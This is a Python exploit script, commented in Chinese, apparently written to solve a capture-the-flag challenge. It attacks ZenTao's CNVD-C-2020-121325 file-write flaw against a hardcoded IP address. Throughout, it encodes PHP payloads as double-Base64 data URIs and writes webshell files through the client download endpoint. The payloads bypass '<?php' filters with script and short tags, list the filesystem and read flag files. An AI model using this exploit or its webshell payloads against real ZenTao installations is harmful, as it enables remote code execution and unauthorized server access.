#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 - 0字节文件终极修正版
关键改进：
1. 使用 URL-Safe Base64 (替换 +/ 为 -_) 适配禅道 helper 类
2. 使用 <script language="php"> 绕过 <?php 标签过滤
3. 移除 Data URI 中的后缀干扰
"""

import requests
import base64
import time

def solve_final_fix():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 0字节文件修正方案 (URL-Safe Base64 + Tag Bypass)    ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 建立 Session
    print("[*] 建立 Session...")
    try:
        session.get(f"{base_url}/zentao/", timeout=5)
        print("    ✓ Session 已建立\n")
    except:
        print("    ! 警告: Session 建立失败\n")

    # [改进 1] 使用 <script> 标签绕过 <?php 过滤
    php_payloads = [
        # Payload A: 经典标签 + 扫描 + 读取
        """<?php
error_reporting(0);
echo "---SUCCESS A---\\n";
echo "LS: " . implode(" ", scandir("/")) . "\\n";
echo "FLAG: " . file_get_contents("/flag");
?>""",

        # Payload B: Script 标签 (绕过 <?php WAF)
        """<script language="php">
error_reporting(0);
echo "---SUCCESS B---\\n";
echo "LS: "; print_r(scandir("/"));
echo "FLAG: " . file_get_contents("/flag");
</script>""",

        # Payload C: 短标签 (绕过 <?php)
        """<?= "---SUCCESS C---\\n" . file_get_contents("/flag"); ?>""",

        # Payload D: 只读取 flag，最简化
        """<?php echo file_get_contents("/flag"); ?>""",

        # Payload E: 尝试其他路径
        """<?php
echo "TRY1: " . file_get_contents("/flag") . "\\n";
echo "TRY2: " . file_get_contents("/flag.txt") . "\\n";
echo "TRY3: " . file_get_contents("../flag") . "\\n";
?>"""
    ]

    for i, payload in enumerate(php_payloads):
        print("=" * 70)
        print(f"尝试 Payload 变体 {chr(65+i)}")
        print("=" * 70)
        print(f"Payload 内容:\n{payload[:100]}...\n")

        # 1. 内层 Base64 (PHP代码 -> Base64)
        inner_b64 = base64.b64encode(payload.encode()).decode()
        print(f"[*] 内层 Base64 长度: {len(inner_b64)}")

        # 2. 构造纯净的 Data URI (不带后缀)
        data_uri = f"data:text/plain;base64,{inner_b64}"
        print(f"[*] Data URI: {data_uri[:60]}...")

        # 3. 外层 Base64 (Data URI -> Base64) - 传给 link 参数
        outer_b64 = base64.b64encode(data_uri.encode()).decode()

        # [关键改进] 转换为 URL-Safe Base64
        # 禅道的 helper::safe64Decode 会把 - 转为 +, _ 转为 /
        # 所以我们发送时要把 + 转为 -, / 转为 _
        link_param_safe = outer_b64.replace('+', '-').replace('/', '_')

        print(f"[*] Link 参数 (标准): {outer_b64[:60]}...")
        print(f"[*] Link 参数 (Safe):  {link_param_safe[:60]}...")
        print(f"[*] 字符替换: +->- 共 {outer_b64.count('+')} 处, /->_ 共 {outer_b64.count('/')} 处\n")

        filename = f"shell_{chr(65+i)}.php"

        params = {
            "m": "client",
            "f": "download",
            "link": link_param_safe,
            "fileName": filename
        }

        try:
            # 发送请求
            print(f"[*] 发送请求到 {base_url}/zentao/index.php")
            resp = session.get(f"{base_url}/zentao/index.php", params=params, timeout=10)
            print(f"    上传响应: {resp.status_code}")

            # 验证结果
            target_url = f"{base_url}/zentao/data/client/1/{filename}"
            print(f"\n[*] 访问结果文件: {target_url}")

            time.sleep(1.5)
            res = session.get(target_url, timeout=5)

            print(f"    文件状态: {res.status_code}")
            print(f"    文件大小: {len(res.content)} bytes")

            if len(res.content) > 0:
                print("\n" + "🎉" * 35)
                print(f"✓✓✓ 成功写入内容！Payload {chr(65+i)} 有效！")
                print("🎉" * 35)
                print("\n文件内容:")
                print("=" * 70)
                print(res.text)
                print("=" * 70)

                if "flag{" in res.text.lower() or "ctf{" in res.text.lower() or "success" in res.text.lower():
                    print("\n🚩🚩🚩 Flag 获取成功或 Payload 执行成功！🚩🚩🚩")
                    return res.text
            else:
                print("    ✗ 依然是 0 字节\n")

        except Exception as e:
            print(f"    ✗ 异常: {e}\n")

    print("\n" + "=" * 70)
    print("所有 Payload 都已尝试")
    print("=" * 70)
    return None


if __name__ == "__main__":
    print("[*] 启动修正版利用脚本...\n")
    result = solve_final_fix()

    if result:
        print("\n" + "=" * 70)
        print("任务完成！最终结果:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[-] 未能成功利用")
        print("[*] 下一步建议:")
        print("    1. 检查禅道版本是否确实存在此漏洞")
        print("    2. 尝试其他漏洞点（SQL注入、SSRF等）")
        print("    3. 查看题目是否有其他提示")
